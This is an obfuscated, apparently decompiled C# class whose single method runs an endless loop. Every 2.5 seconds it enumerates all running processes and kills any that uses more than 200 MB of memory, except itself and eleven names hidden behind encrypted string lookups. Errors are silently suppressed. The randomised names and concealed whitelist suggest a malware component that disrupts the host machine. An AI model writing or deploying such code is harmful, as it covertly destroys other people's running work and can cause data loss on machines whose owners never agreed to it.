using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ovnaSovhORzB;

public static class nYCaNltUniIEY
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void mpaMAUOMmRxTUo()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107473129)) && !process.ProcessName.Contains(getString_0(107473120)) && !process.ProcessName.Contains(getString_0(107473143)) && !process.ProcessName.Contains(getString_0(107473134)) && !process.ProcessName.Contains(getString_0(107473089)) && !process.ProcessName.Contains(getString_0(107473108)) && !process.ProcessName.Contains(getString_0(107473575)) && !process.ProcessName.Contains(getString_0(107473594)) && !process.ProcessName.Contains(getString_0(107473581)) && !process.ProcessName.Contains(getString_0(107473536)) && !process.ProcessName.Contains(getString_0(107473515)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static nYCaNltUniIEY()
	{
		Strings.CreateGetStringDelegate(typeof(nYCaNltUniIEY));
	}
}
